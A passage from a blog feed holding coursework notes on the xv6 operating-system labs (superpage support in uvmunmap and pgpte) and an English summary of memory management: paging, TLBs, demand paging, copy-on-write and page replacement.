ä¹Ÿéœ€è¦æ˜¯èƒ½å¤„ç†å¤§é¡µçš„æœ€ç»ˆç‰ˆæœ¬</span></span><br><span class="line">  uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="32-ä¿®æ”¹-uvmunmap"><a class="markdownIt-Anchor" href="#32-ä¿®æ”¹-uvmunmap"></a> 3.2 ä¿®æ”¹ Â uvmunmap()</h3><p>å½“è¿›ç¨‹é€€å‡ºæ—¶ï¼ˆ<code>kill</code> æˆ– <code>exit</code>ï¼‰ï¼Œéœ€è¦é‡Šæ”¾å…¶æ‰€æœ‰å†…å­˜ã€‚æ ‡å‡†çš„ Â <code>uvmunmap</code>Â  ä¹Ÿæ˜¯æŒ‰ 4KB é¡µé¢æ¥è§£é™¤æ˜ å°„å’Œé‡Šæ”¾çš„ã€‚ä¸ Â <code>uvmcopy</code>Â  çš„é€»è¾‘ç›¸ä¼¼ï¼Œå®ƒåœ¨éå†é¡µè¡¨æ—¶ä¹Ÿéœ€è¦èƒ½å¤Ÿ<strong>è¯†åˆ«å‡º L1 å¤§é¡µ PTE</strong>ã€‚</p><p>å½“è¯†åˆ«å‡ºå¤§é¡µæ—¶ï¼Œ(1) ä» L1 PTE ä¸­æå–å‡º 2MB ç‰©ç†å—çš„åœ°å€ï¼Œ(2) è°ƒç”¨ Â <code>superfree()</code>Â  å°†è¿™ä¸ª 2MB ç‰©ç†å—å½’è¿˜åˆ°å¤§é¡µç©ºé—²é“¾è¡¨ <code>kmem_super.freelist</code> å®ç°ç‰©ç†å†…å­˜é‡Šæ”¾ ï¼ˆ<code>de_free</code> å¯é€‰ï¼‰ï¼Œ(3) æœ€åå°†è¿™ä¸ª L1 PTE æ¸…é›¶ä»¥å–æ¶ˆè™šæ‹Ÿåœ°å€æ˜ å°„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">uvmunmap</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va, uint64 npages, <span class="type">int</span> do_free)</span>&#123;</span><br><span class="line">  uint64 a, super_base;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((va % PGSIZE) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;uvmunmap: not 4KB-aligned&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å†…éƒ¨æ§åˆ¶æ­¥é•¿</span></span><br><span class="line">  <span class="keyword">for</span>(a = va; a &lt; va + npages*PGSIZE;)&#123;</span><br><span class="line">    <span class="comment">// å…ˆå°è¯•vaæ˜¯å¦å­˜åœ¨åœ¨ä¸€ä¸ªå¤§é¡µä¸­</span></span><br><span class="line">    super_base = SUPERPGROUNDDOWN(a);</span><br><span class="line">    pte = walk_l1(pagetable, super_base, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pte != <span class="number">0</span> &amp;&amp; (*pte &amp; PTE_V) &amp;&amp; (*pte &amp; (PTE_R|PTE_W|PTE_X)))&#123;</span><br><span class="line">      <span class="comment">// aå­˜åœ¨åœ¨ä¸€ä¸ªå¤§é¡µä¸­</span></span><br><span class="line">      <span class="comment">// super_base æ˜¯aæ‰€åœ¨superpageçš„è™šæ‹Ÿé¡µèµ·å§‹åœ°å€</span></span><br><span class="line">      <span class="keyword">if</span>(do_free)&#123;</span><br><span class="line">        uint64 pa = PTE2PA(*pte);</span><br><span class="line">        superfree((<span class="type">void</span>*)pa);</span><br><span class="line">      &#125;</span><br><span class="line">      *pte = <span class="number">0</span>;</span><br><span class="line">      a = super_base + SUPERPGSIZE;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="comment">// ä¸å­˜åœ¨</span></span><br><span class="line">      <span class="keyword">if</span>((pte = walk(pagetable, a, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;uvmunmap: walk&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;va=%ld pte=%ld\n&quot;</span>, a, *pte);</span><br><span class="line">        panic(<span class="string">&quot;uvmunmap: not mapped&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(PTE_FLAGS(*pte) == PTE_V)</span><br><span class="line">        panic(<span class="string">&quot;uvmunmap: not a leaf&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(do_free)&#123;</span><br><span class="line">        uint64 pa = PTE2PA(*pte);</span><br><span class="line">        kfree((<span class="type">void</span>*)pa);</span><br><span class="line">      &#125;</span><br><span class="line">      *pte = <span class="number">0</span>;</span><br><span class="line">      a += PGSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤æˆ‘ä»¬çš„æ‰€æœ‰è¦æ±‚éƒ½å·²å®Œæˆï¼Œæ²¡æœ‰å‡ºé”™çš„è¯ xv6 å·²ç»æ”¯æŒ superpage äº†ã€‚<br>é‚£ä¹ˆï¼Œpgtbltestï¼Œå¯åŠ¨ï¼<br><img src="/2025/07/05/Lab-Page%20Tables/test_failed.png" alt="test_failed.png"><br><s>pgtbltestï¼Œå…³é—­ï¼</s> å›å¤´çœ‹ <code>superpg_test</code> çš„æµ‹è¯•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// user/pgtbltest.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">supercheck</span><span class="params">(uint64 s)</span>&#123;</span><br><span class="line">  <span class="type">pte_t</span> last_pte = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (uint64 p = s;  p &lt; s + <span class="number">512</span> * PGSIZE; p += PGSIZE) &#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = (<span class="type">pte_t</span>) pgpte((<span class="type">void</span> *) p);</span><br><span class="line">    <span class="keyword">if</span>(pte == <span class="number">0</span>)</span><br><span class="line">      err(<span class="string">&quot;no pte&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((uint64) last_pte != <span class="number">0</span> &amp;&amp; pte != last_pte) &#123;</span><br><span class="line">        err(<span class="string">&quot;pte different&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="type">pte_t</span>* <span class="title function_">pgpte</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> walk(pagetable, va, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼ å…¥<code>supercheck</code>çš„è™šæ‹Ÿåœ°å€<code>s</code>æ˜¯ 2MB å¯¹é½çš„ï¼Œè€Œå®ƒå®é™…æ˜ å°„çš„æ˜¯ä¸€ä¸ª superpageï¼Œæµ‹è¯•ä»£ç ç›´æ¥å°†å…¶ä¼ é€’ç»™ç³»ç»Ÿè°ƒç”¨ <code>pgpte</code>ï¼Œå³å¯»æ‰¾é¡µè¡¨ä¸­ <code>s</code> å¯¹åº”çš„é¡µè¡¨é¡¹ï¼Œè€Œ <code>pgpte</code> åªæ˜¯ç®€å•å¾—ä½¿ç”¨äº† <code>walk</code>ï¼Œé‚£ä¹ˆå®ƒä¼šåœ¨ L1 é¡µè¡¨é¡¹ä¸­é‡åˆ°ä¸€ä¸ªå¤§é¡µ PTE æ—¶ï¼Œæ­¤æ—¶ï¼š<code>if(pte &amp; PTE_V)</code>Â  åˆ¤æ–­é€šè¿‡ï¼Œ<code>pagetable = (pagetable_t)PTE2PA(*pte)</code> æŠŠå¤§é¡µ PTE æŒ‡å‘çš„<strong>ç‰©ç†æ•°æ®é¡µ</strong>çš„åœ°å€å½“ä½œäº†<strong>ä¸‹ä¸€çº§é¡µè¡¨çš„ç‰©ç†é¡µåœ°å€</strong>ï¼è¿™å°±æ˜¯ error å‡ºç°çš„åœ°æ–¹ï¼Œä¸‹ä¸€è½®å¾ªç¯å°è¯•è®¿é—®é¡µè¡¨ Â <code>pte = &amp;pagetable[PX(0, va)]</code>ï¼Œè¯•å›¾å°†ä¸€ä¸ª<strong>ç‰©ç†æ•°æ®é¡µ</strong>å½“ä½œä¸€ä¸ª<strong>é¡µè¡¨</strong>æ¥ç´¢å¼•ã€‚è¿™ä¼šå¯¼è‡´è®¿é—®éæ³•å†…å­˜ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç«‹å³ Â panicã€‚</p><p>æ‰€ä»¥ï¼Œæœ€ç»ˆçœ‹åˆ°çš„ fault <code>pte = 0</code>Â  å¯èƒ½æ˜¯ Â <code>walk</code>Â  åœ¨å¤±è´¥æ—¶è¿”å›äº† 0ï¼Œæˆ–è€…æ˜¯ Â <code>pgpte</code>Â  è¿™ä¸ªç³»ç»Ÿè°ƒç”¨åœ¨å†…æ ¸ä¸­ Â panicÂ  äº†ï¼ˆæ²¡æœ‰ä»”ç»†çœ‹ï¼‰ï¼Œå¯¼è‡´ç”¨æˆ·ç¨‹åºæ”¶åˆ°äº†ä¸€ä¸ªæ— æ•ˆçš„è¿”å›å€¼ã€‚</p><p><strong>å¦‚æœè¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè‚¯å®šæ˜¯å¾—ä¿®æ”¹æ¡†æ¶ä»£ç æä¾›çš„ syscall <code>pgpte()</code> å†…æ ¸å®ç°çš„</strong>ï¼Œä½†æ˜¯æˆ‘çœ‹ç½‘ä¸Šçš„åŒå­¦ä»¬å¥½åƒéƒ½æ²¡æœ‰æåˆ°è¿™ç‚¹ï¼Œæˆ–è®¸æ˜¯å®ç°æ–¹å¼ä¸åŒã€‚</p><p><code>pgpte()</code> çš„é€»è¾‘åº”è¯¥å’Œæˆ‘ä»¬ä¹‹å‰å†™ <code>uvmunmap</code> å’Œ <code>uvmcopy</code> çš„é€»è¾‘å·®ä¸å¤šï¼Œéƒ½éœ€è¦åˆ¤æ–­è¿™ä¸ªè™šæ‹Ÿåœ°å€æ˜¯å¦å­˜åœ¨äº superpage ä¸­ï¼Œå³åˆ¤æ–­è™šæ‹Ÿåœ°å€ <code>va</code> æ˜ å°„çš„æ˜¯ 4KB çš„å°é¡µè¿˜æ˜¯æ˜ å°„çš„ 2MB çš„å¤§é¡µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pte_t</span>*</span><br><span class="line"><span class="title function_">pgpte</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va)</span> &#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1. ä¼˜å…ˆæ£€æŸ¥ L1ï¼Œçœ‹æ˜¯å¦å­˜åœ¨å¤§é¡µ</span></span><br><span class="line">  pte = walk_l1(pagetable, va, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. æ£€æŸ¥ walk_l1 çš„ç»“æœæ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å¤§é¡µå¶å­èŠ‚ç‚¹</span></span><br><span class="line">  <span class="keyword">if</span>(pte != <span class="number">0</span> &amp;&amp; (*pte &amp; PTE_V) &amp;&amp; (*pte &amp; (PTE_R|PTE_W|PTE_X)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// æ‰¾åˆ°äº†ä¸€ä¸ªå¤§é¡µPTEï¼Œç›´æ¥è¿”å›å®ƒçš„åœ°å€ã€‚</span></span><br><span class="line">    <span class="keyword">return</span> pte;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. å¦‚æœä¸æ˜¯å¤§é¡µï¼Œæˆ–è€… walk_l1 å¤±è´¥äº†ï¼Œ</span></span><br><span class="line">  <span class="comment">//    åˆ™å›é€€åˆ°æ ‡å‡†çš„ walkï¼Œå»æŸ¥æ‰¾ L0 çš„å°é¡µ PTEã€‚</span></span><br><span class="line">  pte = walk(pagetable, va, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// walk çš„ç»“æœå¯èƒ½æ˜¯ 0 (æœªæ˜ å°„)ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ L0 PTE åœ°å€ã€‚</span></span><br><span class="line">  <span class="keyword">return</span> pte;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å®Œåï¼Œæµ‹è¯•é€šè¿‡ï¼š<br><img src="/2025/07/05/Lab-Page%20Tables/test_passed.png" alt="test_passed.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Before you start coding, read Chapter 3 of theÂ &lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2023/xv6/book-riscv-rev3.pdf&quot;&gt;xv6 b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Operating System Concepts: Memory Management</title>
    <link href="http://example.com/2025/05/19/Operating-System-Concepts-Ch8&amp;Ch9/"/>
    <id>http://example.com/2025/05/19/Operating-System-Concepts-Ch8&amp;Ch9/</id>
    <published>2025-05-19T13:32:29.399Z</published>
    <updated>2025-05-19T13:35:52.814Z</updated>
    
    <content type="html"><![CDATA[<p>In the foregoing chapters we actually discussed about <strong>CPU sharing</strong> among processes. If we want to execute a process, it should be first loading into memory, so the memory will be shared by other processes simultaneously to allow multiprogramming. In chapter 8 and chapter 9, we will focus on <strong>memory sharing</strong>.</p><h1 id="memory-management-algorithms"><a class="markdownIt-Anchor" href="#memory-management-algorithms"></a> Memory-management Algorithms</h1><h2 id="contiguous-memory-allocation"><a class="markdownIt-Anchor" href="#contiguous-memory-allocation"></a> Contiguous Memory Allocation</h2><p>In <strong>contiguous memory allocation</strong>, each process (OS process or user process) is contained in a single section of memory that is contiguous to the section containing the next process.</p><h3 id="problem-1-protection"><a class="markdownIt-Anchor" href="#problem-1-protection"></a> Problem 1 : Protection</h3><blockquote><p>How to protect the memory address space from accessing by others?</p></blockquote><p>Since the process is contiguous in memory, which means we can use two registers for each process to limit their address accessing: <strong>limit register</strong> and <strong>relocation register</strong>. When CPU shceduler selects a process for execution, the dispatcher loads the relocation and limit registers as part of context switch, then MMU will maps the logical address dynamically by adding the two values to specific physical address.</p><p><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/contiguous.png" alt="contiguous.png"></p><h3 id="problem-2-allocation"><a class="markdownIt-Anchor" href="#problem-2-allocation"></a> Problem 2 : Allocation</h3><blockquote><p>How to share memory among processes?</p></blockquote><p>One simple methods, <strong>mutiple-partition</strong>: dividing memory into several fixed-sized partitions, and each partition may cotain exactly one process. This method will cause a bunch of memory waste, typically in <strong>internal fragmentation</strong>.</p><p>In the <strong>variable-partition shceme</strong>, the operating system may keep a table indicating which parts of memory are available and which are occupied. In general, the memory blocks available comprise a set of <strong>holes</strong> of various size scattered throughout memory. When a process is to swapped into memory, OS will find an free block that is large enough. If the hole is too large, it is split into two parts, one is allocated to the arriving process; the other is returned to the set of holes, these adjacent holes are merged to form one larger hole.</p><hr><p>As processes are loaded and removed from memory, the free memory space is broken into little, which are called <strong>external fragmentation</strong>. It exists then there is enough total memory space to satisfy a request but the available spaces are not contiguous!</p><p>One solution to the external-fragmentation problem is to permit the logical address space of the processes to be <strong>noncontiguous</strong>. Two complementary techniques achieve this solution: segmentation and paging.</p><h2 id="segmentation"><a class="markdownIt-Anchor" href="#segmentation"></a> Segmentation</h2><p>Hardware can provide a memory mechanism that mapped the programmerâ€™s view to the actual physical memory, which system would have more freedom to manage memory, while the programmer would have a more natural programming environment (<strong>uncoupling</strong>).</p><p>In sementation shceme, a logical address space is a collection of segments, each has a name and a length. The programmer specifies each address by two quantities: a segment name and an offset, as <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>&lt;</mo><mi>s</mi><mi>e</mi><mi>g</mi><mi>m</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo>âˆ’</mo><mi>n</mi><mi>u</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>r</mi><mo separator="true">,</mo><mi>o</mi><mi>f</mi><mi>f</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;segment-number,offset&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>.</p><p>In order to map the two-dimentional logical address to one-dimentional physical address, we use a datastructure called <strong>segment table</strong>. Each entry of segment table has a segment base and a segment limit (similar to conitiguous allocation). The use of a segment table is illustrated below, where <code>s</code> stands for a segment number and <code>d</code> referred to a s the offset from base address of the segment.</p><p><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/segmentation.png" alt="segmentation.png"></p><h2 id="paging"><a class="markdownIt-Anchor" href="#paging"></a> Paging</h2><p>Paging is another memory-management scheme that permits the physical adress space of a process to be noncontiguous.</p><p>The basic method for implementing paging involves breaking physical memory into fixed-sized blocks caclled <strong>frames</strong> and breaking logical memory into blocks of the same size called <strong>pages</strong>. In this way, paging avoids external fragmentation and the need for compaction.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">command</span> <span class="keyword">for</span> querying page size <span class="keyword">in</span> Linux</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">getconf PAGESIZE</span></span><br><span class="line">4096</span><br></pre></td></tr></table></figure><p><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/paging.png" alt="paging.png"><br>Every address generated by CPU is divided into two parts: a <strong>page number Â§</strong> and a <strong>page offset (d)</strong>. The page number is used as an index into a <strong>page table</strong>. The page table contains the base address of each frame in physical memory, which maps logical page to phsical frame. Below is the paging model:<br><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/paging-model.png" alt="paging-model.png"><br>Notice that frames are allocated as uints, so we would always allocated more memory to process than it needs, which results in internal fragmentation.</p><h3 id="hardware-support-tlb"><a class="markdownIt-Anchor" href="#hardware-support-tlb"></a> Hardware Support - TLB</h3><p>Some operating system allocate a page table for each process, so a pointer to the page table is stored with the other register values in PCB (e.g., xv6 <code>kernel/proc.h</code>). Other operating systems provide one or at most a few page tables, which decreases the overhead involbed when process are context-switched.</p><p>Page table can be implemented as a set of <strong>dedicated registers</strong>. If we want to access location <em>i</em>, we must first index into the page table, then using the frame number in table entry to access the desired place. <strong>With this shceme, two memory accesses are needed</strong>.</p><p>In pratice, we use a special, small, fast-lookup hardware cache called a <strong>translation look-aside buffer (TLB)</strong>. The TLB is associative, high-speed memory. It stores recently used page table entries, which are used for address translation. When the CPU needs to access a memory location, it first checks the TLB. If the required address translation is found in the TLB (a TLB hit), the access can be completed very quickly, usually in a few clock cycles. If the page number is not in the TLB (a TLB miss), a memory reference to the page table must be made, then we obtain the fram number from memory , and in addition, add the page number and frame numer to the TLB.<br><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/tlb.png" alt="tlb.png"></p><h1 id="virtual-memory"><a class="markdownIt-Anchor" href="#virtual-memory"></a> Virtual Memory</h1><p>Segmentation and paging are fundamental memory-management strategies that bridge the gap between the programmerâ€™s view of a continuous memory space and the reality of physical memory. From a programmerâ€™s perspective, memory appears as a seamless, contiguous expanse. However, in the physical realm, memory is divided into blocks scattered across various locations.</p><p>Segmentation divides the program into logical segments such as the code segment, data segment, and stack segment. <strong>Each segment is a continuous block of virtual memory</strong>, which is then mapped to different parts of the physical memory. Paging, on the other hand, partitions both virtual and physical memory into fixed-size pages. These pages are used to establish a mapping relationship between the virtual and physical memory spaces.</p><p><strong><em>Virtual memory</em> builds upon these segmentation and paging mechanisms.</strong> It extends the concept by enabling a mapping between physical memory pages and blocks in the back storage, typically a hard disk. When a process needs more memory than is currently available in physical memory, the operating system can swap out less-used pages from the physical memory to the back storage and bring in the required pages. This process creates an illusion for each process, allowing it to operate as if it has access to a larger memory space than the actual physical memory.</p><h2 id="mechanism"><a class="markdownIt-Anchor" href="#mechanism"></a> Mechanism</h2><h3 id="1-demand-paging"><a class="markdownIt-Anchor" href="#1-demand-paging"></a> 1. Demand Paging</h3><p>When a executable program is to be loaded to RAM, we can load the entire one in physical memory at execution time, but the fact is that we may not initially <em>need</em> the entire program in memory. <strong>We can just load pages only as they are needed</strong>. This technique is known as <strong>demand paging</strong>.</p><p>First we need some form of hardware support to tell whether the pages are in memory or on the disk. That is <strong>valid-invalid bit</strong>:</p><ul><li>valid bit: The associated page is both legal (belongs to that process) and in memory.</li><li>invalid bit: The page is either not valid or is currently on the disk.<br><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/valid-invalid.png" alt="valid-invalid.png"><br>If access to a page marked invalid, it will cause a <strong>page fault</strong>, then making a <em>trap</em> (<code>syscall</code>) to the operating system. The procedudre for handling the page fault is straightforward:</li></ul><ol><li>Check an internal table to determine whether the access is valid.</li><li>Invalid, terminate the process; Valid but page not in memory, now page it in.</li><li>Find a free frame (frame allocation).</li><li>Schedule a disk operation to read that page into frame.</li><li>Disk read completes, modify internal table and update page table (set valid bit).</li><li>Restart the instruction that was interrupted by the trap.<br><img src="/2025/05/19/Operating-System-Concepts-Ch8&Ch9/page-fault.png" alt="page-fault.png"></li></ol><h3 id="2-copy-on-write"><a class="markdownIt-Anchor" href="#2-copy-on-write"></a> 2. Copy-on-Write</h3><p>With demand paging, we can easily start a process with <code>fork()</code> by just loading the page that contains the first instruction. In fact, <code>fork()</code> works by creating a copy of parentâ€™s address space for child. Child process and parent process are in their own virtual (logical) address space, but actually they share the same pages, which is called copy-on-write pages. When child edit the variable in its address space or invoke the <code>exec()</code> syscall, the operating system will then copy the edited page for child, left others pages shared. This technique is known as <strong>copy-on-write</strong>.</p><p><strong>Copy-on-Write (COW)</strong> is an optimization technique in virtual memory management where <strong>multiple processes share the same physical memory pages</strong> until one process tries to <strong>modify</strong> the shared page. At that point, a <strong>private copy</strong> of the page is made for the writing process, allowing safe modification without affecting others.</p><ul><li>When <strong>either process tries to write</strong> to a shared page:<ol><li>A <strong>page fault</strong> occurs.</li><li>The operating system:<ul><li>Allocates a <strong>new physical page</strong>.</li><li>Copies the contents of the original page to the new page.</li><li>Updates the <strong>page table</strong> of the writing process to point to the new (private) page with <strong>write access</strong>.</li></ul></li><li>Now each process has <strong>its own copy</strong> of that page.</li></ol></li></ul><h2 id="page-replacement"><a class="markdownIt-Anchor" href="#page-replacement"></a> Page Replacement</h2><p>When there is enough free frames in memory, we will not get trouble in physical frame allocation in page swapping. But what about there is <strong>no free frame</strong> on free-frame list? Then we may swap out a process and free all its frames, it works well in some circumstances (in thrashing below). Here we introduce a common solution - <strong>page replacement</strong>.</p><p>Page replacement together with frame allocation are the two fundamental techniques to implement demand paging:</p><ul><li><strong>Frame-allocation alogorithm</strong>: Decide how many frames to allocate to each process.</li><li><strong>Page-repalcement alogorithm</strong>: Decide which page will be swapped out into disk.</li></ul><p>In page replacement, we generally aim to <strong>swap out the page that is least likely to be used soon</strong> to minimize page faults.</p><h3 id="1-fifo-page-replacement"><a class="markdownIt-Anchor" href="#1-fifo-page-replacement"></a> 1. FIFO Page Replacement</h3><p>The <strong>FIFO (First-In, First-Out)</strong> page replacement algorithm replaces the <strong>oldest</strong> page in memory â€” the one that was loaded <strong>first</strong>.</p><p>It uses a <strong>simple queue</strong>:</p><ul><li>When a new page needs to be loaded and memory is full, the page at the <strong>front of the queue</strong> is removed.</li><li>The new page is added to the <strong>back</strong>.</li></ul><p><strong>Drawback:</strong> It may remove frequently used pages just because theyâ€™ve been in memory the longest â€” leading to <strong>more page faults</strong> (this is known as <strong>Beladyâ€™s anomaly</strong>).</p><h3 id="2-lru-page-replacement"><a class="markdownIt-Anchor" href="#2-lru-page-replacement"></a> 2. LRU Page Replacement</h3><p><strong>LRU (Least Recently Used)</strong> replaces the page that <strong>has not been used for the longest time</strong>. The idea is based on the assumption that pages used recently will likely be used again soon.</p><p><strong>Implement Methodsï¼š</strong></p><ol><li>Using a <strong>counter or timestamp</strong> (software simulation), every time a page is accessed, record a timestamp. When a replacement is needed, select the page with the <strong>oldest timestamp</strong>.<ul><li>Pros: Easy to implement logically.</li><li>Cons: Costly in time and space to maintain timestamps.</li></ul></li><li>Using a <strong>stack</strong> (linked list or array) to store the page. On every access:<ul><li>Remove the page from its current position.</li><li>Move it to the <strong>top/front</strong> (most recently used).</li></ul></li><li>Using <strong>hash map + doubly linked list</strong> (efficient LRU cache).<ul><li><strong>Hash Map</strong>: Maps page numbers to nodes in the list.</li><li><strong>Doubly Linked List</strong>: Keeps pages in order of usage â€” head is most recently used, tail is least.</li></ul></li></ol><h3 id="3-second-chance-page-replacement"><a class="markdownIt-Anchor" href="#3-second-chance-page-replacement"></a> 3. Second-chance Page Replacement</h3><p>The <strong>Second-Chance algorithm</strong> is a page replacement strategy that improves on FIFO by giving pages a â€œsecond chanceâ€ before being replaced. One way to implement this strategy is using circular queue.<br>Each page has a <strong>reference bit</strong>:</p><ul><li>When a page is accessed, its bit is set to <strong>1</strong>.</li><li>When a page is selected for replacement:<ul><li>If its reference bit is <strong>0</strong>, itâ€™s replaced.</li><li>If the bit is <strong>1</strong>, itâ€™s cleared and the page and find the next page with rerference bit <strong>0</strong> (giving it a second chance).</li></ul></li></ul><p>This way, frequently used pages are less likely to be swapped out.</p><hr><p><strong>Reference:</strong></p><ul><li><em>Operating System Concepts, 9th edition</em></li><li>ChatGPT 4o</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In the foregoing chapters we actually discussed about &lt;strong&gt;CPU sharing&lt;/strong&gt; among processes. If we want to execute a process, it s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>6.s081 Lab: System Calls</title>
    <link href="http://example.com/2025/05/15/Lab-System%20Calls/"/>
    <id>http://example.com/2025/05/15/Lab-System%20Calls/</id>
    <published>2025-05-15T12:36:40.671Z</published>
    <updated>2025-05-19T12:18:40.479Z</updated>
    
